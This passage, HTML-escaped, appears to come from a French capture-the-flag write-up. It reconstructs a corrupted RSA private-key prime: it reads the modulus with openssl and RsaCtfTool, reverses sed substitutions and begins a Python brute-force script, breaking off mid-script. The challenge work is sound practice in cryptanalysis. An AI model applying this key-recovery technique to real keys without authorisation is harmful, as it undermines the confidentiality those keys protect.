    a5:78:b5:f7:2e:89:5d:5c:37:52:ea:fd:f6:31:cc:
    ba:d2:d9:60:e4:45:1d:67:76:d2:1f:f4:9c:9d:c9:
    b1:90:45:51:ed:d2:7f:dd:b6:74:b4:99:7f:b1:0a:
    d9:b7:c2:be:8b:a4:07:22:0a:8e:3a:36:ff:6d:c1:
    1d:63:93:af:cb:4e:c0:47:9f:65:bf:df:e3:f0:5f:
    1e:98:61:45:74:ec:36:a7:a5:b1:f1:8d:3d:97:6b:
    5a:82:49:09:00:08:0d:9d:c2:74:a4:4e:30:a1:39:
    68:2f:22:34:71:13:aa:3b:f2:20:4f:8e:10:eb:d4:
    d0:9b:b5:8c:c2:53:5f:9d:71:13:0c:0f:21:b6:6e:
    13:39:40:d3:a6:b1:eb:74:ad:dd:0a:29:14:81:b1:
    90:ad:e0:53:f0:89:c8:00:fe:dc:ad:56:59:fc:28:
    1d:c0:cf:5e:08:c0:16:33:24:a3:52:bb:f3:25:10:
    43:c3:73:b8:40:4f:fc:6b:6b:77:bd:5f:22:24:eb:
    7f:15
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Voici donc la vrai valeur de notre nombre $prime1$ ou $p$. Nous devons maintenant trouver $q$, qui vaut:
&lt;script type=&quot;math/tex&quot;&gt;q = \frac{n}{p}&lt;/script&gt;
Nous avons le clé publique &lt;code class=&quot;highlighter-rouge&quot;&gt;public.key&lt;/code&gt;, nous pouvons donc facilement extraire $n$.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl rsa &lt;span class=&quot;nt&quot;&gt;-pubin&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-inform&lt;/span&gt; PEM &lt;span class=&quot;nt&quot;&gt;-text&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-noout&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; public.key &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; modulus.txt
RSA Public-Key: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096 bit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Modulus:
    00:cd:5f:8a:24:c7:60:50:08:89:7a:3c:92:2c:0e:
    81:2e:76:9d:e0:a4:64:42:c3:50:cb:78:c7:86:85:
    39:f3:d3:8a:ac:80:b3:e6:a5:06:60:59:10:e8:59:
    98:06:b4:d1:d1:48:f2:f6:b8:1d:a0:47:96:a8:a5:
    ae:e1:8f:29:e8:3e:16:77:5a:2a:0a:00:87:05:41:
    f6:57:4e:d1:43:86:36:ae:0a:0c:11:6e:07:10:4f:
    48:f7:20:94:86:3a:38:69:e1:c8:fc:22:06:27:27:
    89:62:fb:22:87:3e:31:56:f1:8e:55:de:c9:4e:97:
    00:64:ec:7f:4e:0e:88:45:40:12:e2:fd:5d:fe:5f:
    8d:19:bf:17:0f:9c:cb:3f:46:e0:fd:10:19:bc:b0:
    2d:90:83:a0:70:3c:61:7f:99:63:79:e6:47:83:54:
    a7:3a:e6:e6:ac:bc:e1:f4:33:3e:cf:af:24:36:6a:
    3e:97:7d:3c:d3:cb:fe:8d:8a:38:7b:d8:76:bf:da:
    b8:48:8f:6f:47:bf:1f:be:33:01:0f:d2:d7:e2:2b:
    4d:b2:e5:67:78:3c:e0:b6:06:db:86:b9:37:59:71:
    4c:4f:63:96:a7:fb:9f:74:c4:02:10:43:b0:f3:d4:
    6d:26:33:eb:d4:3a:87:78:63:df:7d:68:0f:50:65:
    87:c1:19:dd:64:10:0c:a8:31:ce:2a:f3:3d:95:1b:
    52:4c:5f:06:b4:9f:5b:f2:cb:38:1e:74:18:19:30:
    d0:6a:80:50:5c:06:ab:d5:bf:48:70:f0:c9:fb:58:
    1b:d8:0d:ba:88:96:60:63:9f:93:6e:de:a8:fe:5d:
    0c:9e:ae:58:06:2e:d6:93:25:25:83:c7:1c:c7:82:
    ba:61:3e:01:43:8e:69:b4:3f:9e:64:ec:a8:4f:9e:
    a0:4e:81:1a:d7:b3:9e:fd:78:76:d1:b6:b5:01:c4:
    f4:8a:cc:e6:f2:42:39:f6:c0:40:28:78:81:35:cd:
    88:c3:d1:5b:e0:f2:eb:b7:de:9e:9c:19:a7:a9:30:
    37:00:5e:e0:a9:a6:40:ba:da:33:2e:c0:d0:5e:e9:
    f0:8a:83:23:54:a0:48:7a:92:7d:5e:88:06:6e:25:
    69:e6:c5:d4:68:8e:42:2b:fa:0b:27:c6:17:1c:6d:
    7b:f0:29:bf:d9:16:57:52:af:19:aa:71:b3:3a:1e:
    a7:0b:6c:37:1f:b2:1e:47:f5:27:d8:0b:7d:04:f5:
    82:ad:9f:99:35:af:72:36:82:dc:01:ca:98:80:62:
    18:70:de:cb:7a:d1:56:48:cd:f4:ef:15:30:16:f3:
    e6:d8:79:33:b8:ec:54:cf:a1:fd:f8:7c:46:70:20:
    a3:e7:53
Exponent: 65537 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x10001&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# autre façon&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsactftool.py &lt;span class=&quot;nt&quot;&gt;--dumpkey&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--key&lt;/span&gt; ./public.key
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; n: 837849563862443268467145186974119695264713699736869090645354954749227901572347301978135797019317859500555501198030540582269024532041297110543579716921121054608494680063992435808708593796476251796064060074170458193997424535149535571009862661106986816844991748325991752241516736019840401840150280563780565210071876568736454876944081872530701199426927496904961840225828224638335830986649773182889291953429581550269688392460126500500241969200245489815778699333733762961281550873031692933566002822719129034336264975002130651771127313980758562909726233111335221426610990708111420561543408517386750898610535272480495075060087676747037430993946235792405851007090987857400336566798760095401096997696558611588264303087788673650321049503980655866936279251406742641888332665054505305697841899685165810087938256696223326430000379461379116517951965921710056451210314300437093481577578273495492184643002539393573651797054497188546381723478952017972346925020598375000908655964982541016719356586602781209943943317644547996232516630476025321795055805235006790200867328602560320883328523659710885314500874028671969578391146701739515500370268679301080577468316159102141953941314919039404470348112690214065442074200255579004452618002777227561755664967507
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; e: 65537
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous connaissons maintenant la valeur de $n$, not:re $modulus$. C’est la forme en base 10 qui va nous intéresser.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; p &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;.join&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;open&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'prime_good.txt'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.readlines&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; import re
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; p &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; int&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;re.sub&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'[^0-9a-f]'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;,p[6:]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; import gmpy
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; gmpy.is_prime&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;p&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sauf que, problème, on se rend compte qu’après avoir passé notre &lt;code class=&quot;highlighter-rouge&quot;&gt;prime_good.txt&lt;/code&gt; en base 10, celui-ci n’est pas premier… :(&lt;/p&gt;

&lt;p&gt;Après réflexions, l’inversion des &lt;code class=&quot;highlighter-rouge&quot;&gt;sed&lt;/code&gt; que l’on a fait plus haut n’est peut-être pas suffisante. Par exemple, si nous avons la chaîne ; &lt;code class=&quot;highlighter-rouge&quot;&gt;xxxxbbxx&lt;/code&gt; et que l’on applique &lt;code class=&quot;highlighter-rouge&quot;&gt;sed -i s/bb/xx/g&lt;/code&gt;, ce qui nous donne &lt;code class=&quot;highlighter-rouge&quot;&gt;xxxxxxxx&lt;/code&gt;. On pense alors qu’il suffit d’inverser le &lt;code class=&quot;highlighter-rouge&quot;&gt;sed&lt;/code&gt; en &lt;code class=&quot;highlighter-rouge&quot;&gt;sed -i s/xx/bb/g&lt;/code&gt; pour retrouver le message originel. Sauf que non, on se retrouve avec &lt;code class=&quot;highlighter-rouge&quot;&gt;bbbbbbbb&lt;/code&gt;. C’est sûrement le même problème avec notre &lt;code class=&quot;highlighter-rouge&quot;&gt;prime_good.txt&lt;/code&gt;, l’inversion du &lt;code class=&quot;highlighter-rouge&quot;&gt;sed&lt;/code&gt; ne garantis pas de retrouver le vrai $prime$ d’origine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/cd/b5/g'&lt;/span&gt; prime_good.txt &lt;span class=&quot;c&quot;&gt;# 2 occurrences de 'b5'&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/57/a4/g'&lt;/span&gt; prime_good.txt &lt;span class=&quot;c&quot;&gt;# 3 occurrences de 'a4'&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/54/16/g'&lt;/span&gt; prime_good.txt &lt;span class=&quot;c&quot;&gt;# 1 occurrence de '16'&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/12/f4/g'&lt;/span&gt; prime_good.txt &lt;span class=&quot;c&quot;&gt;# 1 occurrence de 'f4'&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/66/e1/g'&lt;/span&gt; prime_good.txt &lt;span class=&quot;c&quot;&gt;# on ignore car présent au début&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/fb/7f/g'&lt;/span&gt; prime_good.txt &lt;span class=&quot;c&quot;&gt;# 4 occurrences de '7f' dans godd_prime.txt&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Il faut donc tester toutes les combinaisons possibles, chaque occurrence peut prendre 2 valeurs, soit garder sa valeur actuelle, soit revenir à sa valeur d’origine. Nous allons tester toutes les combinaisons possibles appliquées au fichier &lt;code class=&quot;highlighter-rouge&quot;&gt;prime_good.txt&lt;/code&gt; puis tester à chaque fois si notre $q$ est premier.&lt;/p&gt;

&lt;p&gt;Voici le script qui va effectuer cette tâche :&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;itertools&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;gmpy&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# read modulus (n)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[0-9a-f]{2}:.*:[0-9a-f]{2}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'modulus.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DOTALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# read prime to ajust
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'prime_good.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# hex to ajust
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tab_reg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'7f'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'f4'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'16'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'a4'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'b5'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# find position for each previous hex
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;positions_occ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tab_reg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;compile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;finditer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;positions_occ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;# we ill use binary to find all combinaisons
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;combinaisons_7f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itertools&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;product&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;repeat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;positions_occ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;combinaisons_f4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itertools&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;product&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;repeat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;positions_occ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;combinaisons_16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itertools&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;product&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;repeat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;positions_occ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;combinaisons_a4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itertools&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;product&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;repeat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;positions_occ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;combinaisons_b5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itertools&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;product&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;repeat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;positions_occ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])))&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# adapt '7f'
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_7f&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;combinaisons_7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
